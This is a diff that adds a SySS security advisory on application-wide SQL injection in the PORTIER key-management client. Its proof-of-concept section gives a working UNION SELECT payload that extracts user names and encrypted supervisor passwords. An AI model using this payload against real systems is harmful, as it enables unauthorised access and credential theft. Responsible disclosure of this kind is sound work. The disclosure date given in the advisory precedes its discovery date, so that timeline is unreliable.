@@ -1,0 +1,174 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA512
+
+Advisory ID: SYSS-2018-012
+Product: PORTIER
+Affected Version(s): 4.4.4.2, 4.4.4.6
+Tested Version(s): 4.4.4.2, 4.4.4.6
+Vulnerability Type: SQL Injection (CWE-89)
+Risk Level: HIGH
+Solution Status: Open
+Manufacturer Notification: 2018-06-13
+Solution Date: -
+Public Disclosure: 2018-01-09
+CVE Reference: CVE-2019-5722
+Author of Advisory: Christian Pappas, SySS GmbH
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Overview:
+
+portier vision is a rich client application for managing door keys allocated 
+to certain persons or group of persons.
+
+The manufacturer describes the product as follows (see [1]):
+
+"portierA(r) vision
+ * manages locking systems and access rights in a modern and efficient manner
+ * stores all the details for every single key
+ * provides you lightning fast with all the information you need in a format 
+   you choose
+portier A(r)vision easy - secure - fast, our idea of software."
+
+Due to a lack of user input validation in the parameter handling, portier is 
+application wide vulnerable to various SQL injections, including the login 
+form.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Vulnerability Details:
+
+Many input fields are vulnerable to SQL injection. An SQL injection allows 
+typically an attacker to execute almost arbitrary SQL commands. It is possible 
+to break out of the original query with an uptick, append a custom query and 
+fix the syntax.
+
+The application supports Firebird and MS SQL database servers. Stacked queries 
+do not work with both database servers. One of the vulnerable input fields is 
+the user name within the login form. This allows even unauthenticated users 
+to exploit the application. Because the authentication process is implemented 
+in the client application, the SQL injection in the login form does not allow 
+a login bypass.
+
+The most promising real-life attack among other possible attacks is to steal 
+the encrypted passwords of users with supervisor privileges. Within this 
+application Supervisors have the highest privileges for administrative purpose.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Proof-of-Concept (PoC):
+
+This proof-of-concept will exploit the vulnerability in the search form for a 
+key ring number, but several other vulnerable input fields do exist. Because 
+this is not a web application, most of the publicly available tools for 
+exploiting SQL injections will not work out of the box.
+
+Due to the use of plain text communication between application and database, 
+server it is easy to sniff the traffic and capture the queries made by the 
+application. That comes in handy for building a valid attack vector since the 
+flaw is exploited manually.
+
+Searching for the key ring number 'TRACKME', the application queries the 
+database server as following:
+
+    SELECT 
+    BUND.BUND_ID, BUND.BUNDNUMMER, BUND.BESCHREIBUNG, BUND.ABTEILUNG, BUND.BEREICH, BUND.KOSTENSTELLE, DEPOT.BEZEICHNUNG as DEP_BEZEICHNUNG, BUND.BEMERKUNG_1, BUND.BEMERKUNG_2, BUND.BEMERKUNG_3
+     FROM 
+    BUND BUND
+     LEFT OUTER JOIN DEPOT DEPOT ON DEPOT.DEPOT_ID = BUND.DEPOT_ID 
+    WHERE 
+     ( 1 = 1 ) 
+    AND (upper(BUND.BUNDNUMMER) LIKE 'TRACKME%')
+
+To get hold of the passwords for all supervisor users in the application, it is 
+necessary to break out of the the original, inject the attack vector, and 
+finally fix the SQL syntax:
+
+    ') UNION SELECT 1,user_kz,passwort,1,1,1,1,1,1,1 FROM BENUTZER WHERE (systemuser = 1) AND ('a%' = 'a
+
+'systemuser' within the previous shown attack vector can be replaced by '1' to 
+get the passwords of all users, no matter if they have supervisor privileges 
+or not. In both cases, the username will be displayed in the application next 
+to their password.
+
+The attack vector embedded in the client's query looks like the following:
+
+    SELECT 
+    BUND.BUND_ID, BUND.BUNDNUMMER, BUND.BESCHREIBUNG, BUND.ABTEILUNG, BUND.BEREICH, BUND.KOSTENSTELLE, DEPOT.BEZEICHNUNG as DEP_BEZEICHNUNG, BUND.BEMERKUNG_1, BUND.BEMERKUNG_2, BUND.BEMERKUNG_3
+     FROM 
+    BUND BUND
+     LEFT OUTER JOIN DEPOT DEPOT ON DEPOT.DEPOT_ID = BUND.DEPOT_ID 
+    WHERE 
+     ( 1 = 1 ) 
+    AND (upper(BUND.BUNDNUMMER) LIKE '') UNION SELECT 1,user_kz,passwort,1,1,1,1,1,1,1 FROM BENUTZER WHERE (systemuser = 1) AND ('a%' = 'a%')
+
+The Firebird, unlike the MS SQL, database do not support UNION SELECT query if 
+the entire query is terminated by an ORDER BY statement. Thus the number of 
+out of the application exploitable input fields is with an MS SQL database 
+slightly smaller.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Solution:
+
+Make application wide use of prepared statements for querying the database. 
+SySS GmbH is not aware of a solution to the reported security issue provided 
+by the manufacturer.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Disclosure Timeline:
+
+2018-05-23: Vulnerability discovered
+2018-06-13: Vulnerability reported to manufacturer
+2018-01-09: Public disclosure of vulnerability
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+References:
+
+[1] Product website for PORTIER
+    https://portier.de/
+[2] SySS Security Advisory SYSS-2018-012
+    https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2018-012.txt
+[3] SySS Responsible Disclosure Policy
+    https://www.syss.de/en/news/responsible-disclosure-policy/
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Credits:
+
+This security vulnerability was found by Christian Pappas of SySS GmbH.
+
+E-Mail: christian.pappas@syss.de
+Public Key: ://www.syss.de/fileadmin/dokumente/PGPKeys/Christian_Pappas.asc
+Key ID: 0xC5D4E3BA8BA76B25
+Key Fingerprint: 5655 FDBE 40DF 0CC4 F143 9877 C5D4 E3BA 8BA7 6B25
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Disclaimer:
+
+The information provided in this security advisory is provided "as is" 
+and without warranty of any kind. Details of this security advisory may
+be updated in order to provide as accurate information as possible. The
+latest version of this security advisory is available on the SySS web
+site.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Copyright:
+
+Creative Commons - Attribution (by) - Version 3.0
+URL: https://creativecommons.org/licenses/by/3.0/deed.en
+-----BEGIN PGP SIGNATURE-----
+
+iQEzBAEBCgAdFiEEVlX9vkDfDMTxQ5h3xdTjuounayUFAlw18coACgkQxdTjuoun
+ayX3Ugf/QMDATk/V34U/l66+qn8zHwjL+aNq/+WlTVikCn6I3R2uU6LzXDvgmgiF
+qJEVn/4McQkdHuV4trSaJp0oz0RG/aQbQQp289tbn41xIdhdWNI2Gj2qhDdqUqtG
+bJYIIZ8e2TjQU33J3OJfo68eOprWyq+UJg8abgwiLuUMxlFESeSnwwkxvqSToiPl
+TIg/A87exJjtpbwM7OSwxfUhr4/VGSv8UTp3v6a+9fiA2G1HBMmT3zOuy882V2QP
+D1gr6/lB9J7gTiGLgB1fWtL0BtmBTivtOylc/FVnKiqSzt7v2MwoBzLEc3HsA2mY
+rAIgS1s9cBfoPIkvRHzV8WHyr+CyAA==
+=q3CM
+-----END PGP SIGNATURE-----
